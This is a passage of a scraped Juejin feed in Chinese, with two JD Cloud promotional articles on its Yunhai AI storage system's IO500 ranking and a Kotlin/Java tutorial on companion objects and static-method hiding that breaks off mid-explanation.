12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日，在最新公布的 IO500 排行榜中，京东云云海 AI 存储基于通用 NVMe 盘存储服务器，结合全栈自研软件体系与深度调优，成功跻身 IO500 生产榜单全球前四、国产自研第一。相较传统超算存储技术，云海AI存储不采用 PMEM 硬件，具备更强通用性的同时也实现了更低存储成本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c0739b56f604679adad9e5ef8d86fe7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830405&amp;x-signature=p27tbLiZtFF3O5%2Fq7WbPzPg4H%2Bs%3D" alt="图片.png" loading="lazy"/></p>
<p>IO500是全球高性能计算HPC领域最权威、最具影响力的存储系统性能评测标准之一，评测维度涵盖了高性能存储系统的多个关键能力，包括带宽性能、元数据性能、混合负载、并行性和可扩展性，被誉为全球高性能存储领域的金标准。京东云凭借全自研云海AI存储系统JPFS、无 PMEM 的通用存储硬件架构和20节点小规模存储集群下达成该成绩，印证云海 AI 存储在软件栈调优、数据路径优化、网络 RDMA 处理、并行 I/O 调度等核心技术上，已达国际领先水平。</p>
<p>此次云海 AI 存储JPFS斩获了三项 “全球第一”。首先是通用硬件性能第一，不使用 PMEM 硬件加速，完全基于通用 NVMe SSD 设备，跑出全球领先成绩；其次是性能成本比第一，以更低硬件成本实现接近持久内存架构的性能表现。第三是可规模化落地第一，架构具备高度可复制性，可在智算/超算等大规模存储场景中快速部署。</p>
<p>云海AI存储，作为京东云自主研发的面向AI大模型需求的新一代分布式存储系统，历经京东618、京东11.11大规模实践验证，基于存算分离架构，可以很好满足智算场景极致的存储性能需求，它具备4大特性：</p>
<p><strong>在极致性能</strong>方面，云海AI存储可支持千亿级参数AI大模型，融合超低延时RDMA网络及软件架构优化，4K随机写IOPS达到1000万级，平均延迟在100微秒级，单节点可提供 44GB/s的带宽性能，满足极致的存储性能需求。</p>
<p><strong>在极致性价比方面</strong>，创新的存算分离技术架构，将计算和存储解耦独立，存算资源独立调度，大幅提高资源利用率和系统可靠性。云海支持低至1.1x副本的业内超低冗余的EC存储，并在生产环境成熟使用，磁盘空间利用率高达90%以上。</p>
<p><strong>在高可用性方面</strong>，云海数据可靠性达到11个9，故障秒级恢复用户无感，两副本故障仍可保持数据写入100%可用。历经京东618、京东11.11大规模实践场景打磨，EB级存储规模实践验证。</p>
<p><strong>在自主可控方面</strong>，云海为京东云100%自研产品，代码自研率超98%，核心技术完全自主可控，已与主流国产化硬件和软件兼容互认，并能实现兼容后性能无明显衰减，已在京东核心场景实现国产化实践验证。</p>
<p>目前，来自银行、证券、汽车、零售等领域超100家大型企业，正在使用云海AI存储。面向未来，京东云将持续投入自研存储系统的深度优化，推动高性能存储在 AI 模型训练、科学计算、大规模数据分析等场景中的更广泛应用，助力更多企业重塑AI生产力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[京东云海存储成为全球最大规模基于国产CPU的AI存储技术应用]]></title>    <link>https://juejin.cn/post/7576994308273733651</link>    <guid>https://juejin.cn/post/7576994308273733651</guid>    <pubDate>2025-11-27T06:40:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273733651" data-draft-id="7576994308273700883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="京东云海存储成为全球最大规模基于国产CPU的AI存储技术应用"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2025-11-27T06:40:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            京东云海存储成为全球最大规模基于国产CPU的AI存储技术应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:40:34.000Z" title="Thu Nov 27 2025 06:40:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日，在全球最权威的存储系统性能评测IO500榜单上，京东云海跻身榜单全球前四、国产自研第一。由此，<strong>京东云海存储成为全球最大规模基于国产CPU的AI存储技术应用</strong>，也是目前全球性能最强的基于通用NVMe架构的AI存储。</p>
<h3 data-id="heading-0"><strong>一、极致存储性能，斩获多项全球第一</strong></h3>
<p>基于通用 NVMe 盘存储服务器，结合全栈自研软件体系与深度调优，此次云海 AI 存储斩获了多项 “全球第一”：</p>
<p>首先，<strong>通用硬件性能第一</strong>，不使用 PMEM 硬件加速，完全基于通用 NVMe SSD 设备，跑出全球领先成绩；</p>
<p>其次，<strong>性能成本比第一</strong>，以更低硬件成本实现接近持久内存架构的性能表现。</p>
<p>第三，<strong>可规模化落地第一</strong>，架构具备高度可复制性，可在智算/超算等大规模存储场景中快速部署。</p>
<p>在排行榜单上的优秀成绩，源于京东云十多年在存储领域的技术积累。作为京东云自主研发的面向AI大模型需求的新一代分布式存储系统，历经京东618、京东11.11大规模实践验证，基于存算分离架构，可以很好满足智算场景极致的存储性能需求。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57c8e0fc6b44c0c8eb44a7453c060d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830434&amp;x-signature=XjnD%2FKts7EXUdX1ao4BjtMdxGxY%3D" alt="图片.png" loading="lazy"/></p>
<p>在极致性能方面，云海AI存储可支持千亿级参数AI大模型，自研引擎采用全追加写模型，融合超低延时RDMA网络及软件架构优化，4K随机写IOPS达到1000万级，平均延迟在100微秒级，I/O性能接近本地NVMe磁盘，单节点可提供 44GiB/s的带宽性能。</p>
<p>云海为京东云全自研存储，代码自研率超98%，拥有完全自主知识产权，与主流国产化硬件和软件兼容互认，括操作系统、数据库、中间件、服务器、CPU、主板、网卡、SSD等，并基于全局无锁架构，充分发挥国产硬件能力。</p>
<h3 data-id="heading-1"><strong>二、超100家大型企业选择云海AI存储，加速AI落地产业</strong></h3>
<p>目前，来自银行、证券、汽车、零售等领域超100家大型企业，正在使用云海AI存储。</p>
<p>在科技领域，<strong>科大讯飞</strong>AI营销采用“开源分布式存储软件+服务器硬件”搭建，对十亿级小文件数据量时，读写性能陡然下降。升级京东云AI存储云海后，科大讯飞AI营销实现了一个集群一个文件系统，即可轻松应对多模态大模型时千亿~十万亿参数规模；同时，基于高性能存储层，以及大容量存储层的自动数据分级，在大幅降低存储成本的同时，实现了大模型训练能力的大幅提升，助力AI营销业务降本增效。</p>
<p>在互联网领域，<strong>墨迹天气</strong>是全球领先的气象服务企业，截至2024年，拥有超过7亿用户，天气日查询次数过6亿次。随着业务规模的扩大，墨迹天气越来越多的数据需要在降本增效的目标下进行安全的存储。墨迹天气与京东云云海共同建设新的分布式存储，采用低冗余存储的技术，在不降低性能和可靠性的情况下，只需要1.14个副本，大幅提升资源利用率。</p>
<p>在金融领域，<strong>国内某头部证券公司</strong>传统存储系统在性能、稳定性和故障恢复等方面存在诸多痛点，面临着系统架构整体国产化升级的迫切需求。京东云云海采用多台鲲鹏和海光CPU架构存储一体机搭建分布式存储集群，全面适配国产化系统及虚拟化平台。这一方案不仅满足了该证券公司的国产化需求，还通过提供POSIX、NFS、CIFS、S3等存储协议，支持块、文件和对象存储，实现了一个存储平台满足多种场景需求，提升了信息安全自主可控能力。</p>
<p>面向未来，京东云将持续投入自研存储系统的深度优化，推动高性能存储在 AI 模型训练、科学计算、大规模数据分析等场景中的更广泛应用，助力更多企业重塑AI生产力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin遇上Java 静态方法]]></title>    <link>https://juejin.cn/post/7577049352837971983</link>    <guid>https://juejin.cn/post/7577049352837971983</guid>    <pubDate>2025-11-27T06:37:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352837971983" data-draft-id="7577201863750778920" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin遇上Java 静态方法"/> <meta itemprop="keywords" content="Kotlin,Android,Java"/> <meta itemprop="datePublished" content="2025-11-27T06:37:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="方白羽"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin遇上Java 静态方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    方白羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:37:26.000Z" title="Thu Nov 27 2025 06:37:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Kotlin 遇上 Java 静态方法：一个关于“重写”的陷阱与最佳实践</h2>
<p>在 Android 日常开发中，Kotlin 与 Java 的混合编程已是常态。我们享受着 Kotlin 带来的简洁与安全，但两种语言的底层差异偶尔也会给我们带来一些意想不到的“惊喜”。今天，我们就来剖析一个在继承关系中，由 Kotlin 的 <code>companion object</code>与 Java 的 <code>static</code>方法引发的经典陷阱。</p>
<h3 data-id="heading-1">问题的起点：一个继承引发的困惑</h3>
<p>想象一个常见的场景：我们有一个用 Java 编写的、设计精良的基类 <code>BaseActivity</code>，它提供了一个静态的 <code>launch</code>方法，用于封装复杂的启动逻辑。</p>
<h4 data-id="heading-2">Java 父类 - BaseActivity.java</h4>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>{
    <span class="hljs-comment">// 一个通用的、静态的启动方法</span>
    public static void launch(<span class="hljs-type">Context</span> context, <span class="hljs-type">Class</span>&lt;?&gt; target) {
        <span class="hljs-type">Intent</span> intent = <span class="hljs-keyword">new</span> <span class="hljs-type">Intent</span>(context, target);
        <span class="hljs-comment">// ... 其他通用的参数设置 ...</span>
        context.startActivity(intent);
    }
}
</code></pre>
<p>现在，我们需要用 Kotlin 创建一个子类 <code>MyFeatureActivity</code>，它继承自 <code>BaseActivity</code>。我们希望 <code>MyFeatureActivity</code>也能有一个自己的 <code>launch</code>方法，并且这个方法有一些特殊逻辑，比如传递特定的参数。</p>
<p>我们的第一反应可能是"重写"父类的 <code>launch</code>方法。</p>
<h4 data-id="heading-3">Kotlin 子类 - MyFeatureActivity.kt</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFeatureActivity</span> : <span class="hljs-type">BaseActivity</span>() {

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 目标：创建一个专属的 launch 方法，并"覆盖"父类的同名方法</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
            <span class="hljs-keyword">val</span> intent = Intent(context, MyFeatureActivity::<span class="hljs-keyword">class</span>.java)
            intent.putExtra(<span class="hljs-string">"SPECIAL_DATA"</span>, specialData)
            context.startActivity(intent)
        }
    }
}
</code></pre>
<p>代码写完，一场"混乱"的序幕就此拉开。</p>
<h3 data-id="heading-4">困境一：加上 <code>@JvmStatic</code>，为何编译失败？</h3>
<p>为了让 Kotlin 的 <code>companion object</code>方法能像 Java 的静态方法一样被调用（即 <code>ClassName.method()</code>），我们通常会加上 <code>@JvmStatic</code>注解。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>我们的想法很直接：既然父类是 Java 的 <code>static</code>方法，那我也在子类创建一个对应的 Java <code>static</code>方法，这不就是"重写"了吗？</p>
<p><strong>结果：编译失败！</strong> ​ 编译器会抛出一个类似"Platform declaration clash"的错误。</p>
<h4 data-id="heading-5">原因剖析</h4>
<p>这是两种语言设计哲学的第一次碰撞。</p>
<ul>
<li><strong>Java 世界观</strong>：静态方法属于类，不属于对象实例。它不能被重写（Override），只能被隐藏（Hide）。当子类定义了与父类签名完全相同的静态方法时，父类的方法就被"隐藏"了。</li>
<li><strong>Kotlin 世界观</strong>：Kotlin 的设计更加严格和安全。它认为在子类中声明一个与父类静态方法签名完全相同的方法，是一种意图不明确且危险的操作。为了防止开发者陷入"我以为我重写了，但实际上没有"的认知误区，Kotlin 编译器选择在编译期直接禁止这种行为。</li>
</ul>
<h3 data-id="heading-6">困境二：不加 <code>@JvmStatic</code>，为何行为不一致？</h3>
<p>好吧，既然编译器不让，那我们去掉 <code>@JvmStatic</code>总行了吧？</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>代码编译通过了！我们来尝试调用一下 <code>MyFeatureActivity.launch(...)</code>。</p>
<p>奇怪的现象发生了：</p>
<p><strong>1. 在另一个 Kotlin 文件中调用：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 在 Kotlin 代码中调用</span>
MyFeatureActivity.<span class="hljs-built_in">launch</span>(context, <span class="hljs-string">"some_data"</span>)
</code></pre>
<p>执行的是 <code>MyFeatureActivity</code>中我们新定义的 <code>launch</code>方法。一切正常！</p>
<p><strong>2. 在 Java 文件中调用：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 在 Java 代码中调用</span>
MyFeatureActivity.<span class="hljs-built_in">launch</span>(context, MyFeatureActivity.<span class="hljs-keyword">class</span>);
</code></pre>
<p>执行的竟然是父类 <strong>BaseActivity</strong>​ 的 <code>launch</code>方法！</p>
<h4 data-id="heading-7">原因剖析</h4>
<p>这是两种语言底层实现的第二次碰撞。</p>
<ul>
<li><strong>Kotlin 的视角</strong>：当在 Kotlin 中调用 <code>MyFeatureActivity.launch(...)</code>时，Kotlin 编译器非常"懂"自家的 <code>companion object</code>。它知道这个调用应该被解析为 <code>MyFeatureActivity.Companion.launch(...)</code>，准确地找到了子类中的方法。</li>
